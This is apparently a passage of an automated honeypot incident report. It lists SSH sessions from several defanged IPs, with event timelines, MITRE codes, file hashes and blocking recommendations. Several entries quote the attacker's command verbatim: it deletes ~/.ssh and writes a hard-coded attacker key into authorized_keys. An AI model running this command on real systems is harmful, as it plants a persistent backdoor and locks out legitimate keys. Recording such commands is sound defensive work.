| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:31:06` | `cowrie.session.connect` |
| `2026-04-24 17:31:06` | `cowrie.client.version` |
| `2026-04-24 17:31:07` | `cowrie.client.kex` |
| `2026-04-24 17:31:07` | `cowrie.login.success` |
| `2026-04-24 17:31:07` | `cowrie.session.params` |
| `2026-04-24 17:31:07` | `cowrie.command.input` |
| `2026-04-24 17:31:07` | `cowrie.command.failed` |
| `2026-04-24 17:31:07` | `cowrie.log.closed` |
| `2026-04-24 17:31:08` | `cowrie.session.params` |
| `2026-04-24 17:31:08` | `cowrie.command.input` |
| `2026-04-24 17:31:08` | `cowrie.session.file_download` |
| `2026-04-24 17:31:08` | `cowrie.log.closed` |
| `2026-04-24 17:31:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe5b4fe4ee06

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:31 |
| **Last Seen** | 2026-04-24 17:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:31:09` | `cowrie.session.connect` |
| `2026-04-24 17:31:09` | `cowrie.client.version` |
| `2026-04-24 17:31:09` | `cowrie.client.kex` |
| `2026-04-24 17:31:10` | `cowrie.login.success` |
| `2026-04-24 17:31:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10cff2b22a02

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:31 |
| **Last Seen** | 2026-04-24 17:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:31:52` | `cowrie.session.connect` |
| `2026-04-24 17:31:52` | `cowrie.client.version` |
| `2026-04-24 17:31:52` | `cowrie.client.kex` |
| `2026-04-24 17:31:53` | `cowrie.login.success` |
| `2026-04-24 17:31:53` | `cowrie.session.params` |
| `2026-04-24 17:31:53` | `cowrie.command.input` |
| `2026-04-24 17:31:53` | `cowrie.command.failed` |
| `2026-04-24 17:31:53` | `cowrie.log.closed` |
| `2026-04-24 17:31:54` | `cowrie.session.params` |
| `2026-04-24 17:31:54` | `cowrie.command.input` |
| `2026-04-24 17:31:54` | `cowrie.session.file_download` |
| `2026-04-24 17:31:54` | `cowrie.log.closed` |
| `2026-04-24 17:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c31443ae71f8

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:31 |
| **Last Seen** | 2026-04-24 17:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:31:56` | `cowrie.session.connect` |
| `2026-04-24 17:31:56` | `cowrie.client.version` |
| `2026-04-24 17:31:56` | `cowrie.client.kex` |
| `2026-04-24 17:31:56` | `cowrie.login.success` |
| `2026-04-24 17:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b3e43f42581

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:32 |
| **Last Seen** | 2026-04-24 17:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:32:41` | `cowrie.session.connect` |
| `2026-04-24 17:32:41` | `cowrie.client.version` |
| `2026-04-24 17:32:41` | `cowrie.client.kex` |
| `2026-04-24 17:32:42` | `cowrie.login.success` |
| `2026-04-24 17:32:42` | `cowrie.session.params` |
| `2026-04-24 17:32:42` | `cowrie.command.input` |
| `2026-04-24 17:32:42` | `cowrie.command.failed` |
| `2026-04-24 17:32:42` | `cowrie.log.closed` |
| `2026-04-24 17:32:43` | `cowrie.session.params` |
| `2026-04-24 17:32:43` | `cowrie.command.input` |
| `2026-04-24 17:32:43` | `cowrie.session.file_download` |
| `2026-04-24 17:32:43` | `cowrie.log.closed` |
| `2026-04-24 17:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2b0663406a4

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:32 |
| **Last Seen** | 2026-04-24 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:32:45` | `cowrie.session.connect` |
| `2026-04-24 17:32:45` | `cowrie.client.version` |
| `2026-04-24 17:32:45` | `cowrie.client.kex` |
| `2026-04-24 17:32:45` | `cowrie.login.success` |
| `2026-04-24 17:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fca8163d634

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 17:32 |
| **Last Seen** | 2026-04-24 17:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:32:58` | `cowrie.session.connect` |
| `2026-04-24 17:32:58` | `cowrie.client.version` |
| `2026-04-24 17:32:58` | `cowrie.client.kex` |
| `2026-04-24 17:32:58` | `cowrie.login.success` |
| `2026-04-24 17:32:58` | `cowrie.session.params` |
| `2026-04-24 17:32:58` | `cowrie.command.input` |
| `2026-04-24 17:32:58` | `cowrie.command.failed` |
| `2026-04-24 17:32:58` | `cowrie.log.closed` |
| `2026-04-24 17:32:58` | `cowrie.session.params` |
| `2026-04-24 17:32:58` | `cowrie.command.input` |
| `2026-04-24 17:32:58` | `cowrie.session.file_download` |
| `2026-04-24 17:32:58` | `cowrie.log.closed` |
| `2026-04-24 17:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1f82193ca0d

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 17:33 |
| **Last Seen** | 2026-04-24 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:33:04` | `cowrie.session.connect` |
| `2026-04-24 17:33:04` | `cowrie.client.version` |
| `2026-04-24 17:33:04` | `cowrie.client.kex` |
| `2026-04-24 17:33:04` | `cowrie.login.success` |
| `2026-04-24 17:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d1f8d930f97

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 17:34 |
| **Last Seen** | 2026-04-24 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:34:57` | `cowrie.session.connect` |
| `2026-04-24 17:34:57` | `cowrie.client.version` |
| `2026-04-24 17:34:57` | `cowrie.client.kex` |
| `2026-04-24 17:34:57` | `cowrie.login.success` |
| `2026-04-24 17:34:57` | `cowrie.session.params` |
| `2026-04-24 17:34:57` | `cowrie.command.input` |
| `2026-04-24 17:34:57` | `cowrie.command.failed` |
| `2026-04-24 17:34:57` | `cowrie.log.closed` |
| `2026-04-24 17:34:57` | `cowrie.session.params` |
| `2026-04-24 17:34:57` | `cowrie.command.input` |
| `2026-04-24 17:34:57` | `cowrie.session.file_download` |
| `2026-04-24 17:34:57` | `cowrie.log.closed` |
| `2026-04-24 17:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b15fcb62263

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 17:34 |
| **Last Seen** | 2026-04-24 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:34:59` | `cowrie.session.connect` |
| `2026-04-24 17:34:59` | `cowrie.client.version` |
| `2026-04-24 17:34:59` | `cowrie.client.kex` |
| `2026-04-24 17:34:59` | `cowrie.login.success` |
| `2026-04-24 17:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f37d916e8b6a

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:35 |
| **Last Seen** | 2026-04-24 17:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:35:06` | `cowrie.session.connect` |
| `2026-04-24 17:35:06` | `cowrie.client.version` |
| `2026-04-24 17:35:06` | `cowrie.client.kex` |
| `2026-04-24 17:35:07` | `cowrie.login.success` |
| `2026-04-24 17:35:07` | `cowrie.session.params` |
| `2026-04-24 17:35:07` | `cowrie.command.input` |
| `2026-04-24 17:35:07` | `cowrie.command.failed` |
| `2026-04-24 17:35:07` | `cowrie.log.closed` |
| `2026-04-24 17:35:08` | `cowrie.session.params` |
| `2026-04-24 17:35:08` | `cowrie.command.input` |
| `2026-04-24 17:35:08` | `cowrie.session.file_download` |
| `2026-04-24 17:35:08` | `cowrie.log.closed` |
| `2026-04-24 17:35:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d702431110b9

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:35 |
| **Last Seen** | 2026-04-24 17:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:35:10` | `cowrie.session.connect` |
| `2026-04-24 17:35:10` | `cowrie.client.version` |
| `2026-04-24 17:35:10` | `cowrie.client.kex` |
| `2026-04-24 17:35:10` | `cowrie.login.success` |
| `2026-04-24 17:35:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-056c58197938

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:35 |
| **Last Seen** | 2026-04-24 17:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:35:20` | `cowrie.session.connect` |
| `2026-04-24 17:35:20` | `cowrie.client.version` |
| `2026-04-24 17:35:20` | `cowrie.client.kex` |
| `2026-04-24 17:35:21` | `cowrie.login.success` |
| `2026-04-24 17:35:21` | `cowrie.session.params` |
| `2026-04-24 17:35:21` | `cowrie.command.input` |
| `2026-04-24 17:35:21` | `cowrie.command.failed` |
| `2026-04-24 17:35:21` | `cowrie.log.closed` |
| `2026-04-24 17:35:21` | `cowrie.session.params` |
| `2026-04-24 17:35:21` | `cowrie.command.input` |
| `2026-04-24 17:35:21` | `cowrie.session.file_download` |
| `2026-04-24 17:35:21` | `cowrie.log.closed` |
| `2026-04-24 17:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-679af8208dea

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:35 |
| **Last Seen** | 2026-04-24 17:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:35:23` | `cowrie.session.connect` |
| `2026-04-24 17:35:23` | `cowrie.client.version` |
| `2026-04-24 17:35:23` | `cowrie.client.kex` |
| `2026-04-24 17:35:23` | `cowrie.login.success` |
| `2026-04-24 17:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7846aed892df

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:35 |
| **Last Seen** | 2026-04-24 17:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:35:37` | `cowrie.session.connect` |
| `2026-04-24 17:35:37` | `cowrie.client.version` |
| `2026-04-24 17:35:37` | `cowrie.client.kex` |
| `2026-04-24 17:35:38` | `cowrie.login.success` |
| `2026-04-24 17:35:38` | `cowrie.session.params` |
| `2026-04-24 17:35:38` | `cowrie.command.input` |
| `2026-04-24 17:35:38` | `cowrie.command.failed` |
| `2026-04-24 17:35:38` | `cowrie.log.closed` |
| `2026-04-24 17:35:38` | `cowrie.session.params` |
| `2026-04-24 17:35:38` | `cowrie.command.input` |
| `2026-04-24 17:35:39` | `cowrie.session.file_download` |
| `2026-04-24 17:35:39` | `cowrie.log.closed` |
| `2026-04-24 17:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e696cb2d74a3

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:35 |
| **Last Seen** | 2026-04-24 17:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:35:40` | `cowrie.session.connect` |
| `2026-04-24 17:35:40` | `cowrie.client.version` |
| `2026-04-24 17:35:41` | `cowrie.client.kex` |
| `2026-04-24 17:35:41` | `cowrie.login.success` |
| `2026-04-24 17:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5d3758e8a68

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:36 |
| **Last Seen** | 2026-04-24 17:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:36:22` | `cowrie.session.connect` |
| `2026-04-24 17:36:22` | `cowrie.client.version` |
| `2026-04-24 17:36:22` | `cowrie.client.kex` |
| `2026-04-24 17:36:22` | `cowrie.login.success` |
| `2026-04-24 17:36:23` | `cowrie.session.params` |
| `2026-04-24 17:36:23` | `cowrie.command.input` |
